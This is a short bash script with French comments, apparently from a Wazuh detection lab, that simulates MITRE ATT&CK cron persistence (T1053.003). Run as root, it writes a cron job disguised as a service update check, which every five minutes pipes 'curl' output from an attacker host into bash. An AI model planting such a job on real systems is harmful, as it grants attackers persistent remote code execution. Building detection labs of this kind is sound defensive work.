#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1053.003 — Scheduled Task/Job: Cron
# Technique    : Ajout d'une tâche cron simulant un beacon C2
# Génère       : Wazuh syscheck (modification /etc/cron.d)
#                + rule custom 100003 (pattern malveillant)
# Run depuis   : Cible (Wazuh VM) — nécessite root
# Usage        : sudo bash 06_persistence_cron.sh
# Cleanup      : sudo rm /etc/cron.d/svc_update
# ──────────────────────────────────────────────────────────────────

CRON_FILE="/etc/cron.d/svc_update"
KALI_IP=${1:-192.168.56.103}

echo "[*] Création de la tâche cron malveillante : $CRON_FILE"
cat > "$CRON_FILE" <<EOF
# Service update check — do not remove
*/5 * * * * root curl -s http://$KALI_IP:8080/beacon | bash
EOF

chmod 644 "$CRON_FILE"

echo "[+] Tâche cron créée"
echo "    Fichier   : $CRON_FILE"
echo "    Contenu   : $(cat $CRON_FILE | tail -1)"
echo ""
echo "[!] Cleanup : sudo rm $CRON_FILE"
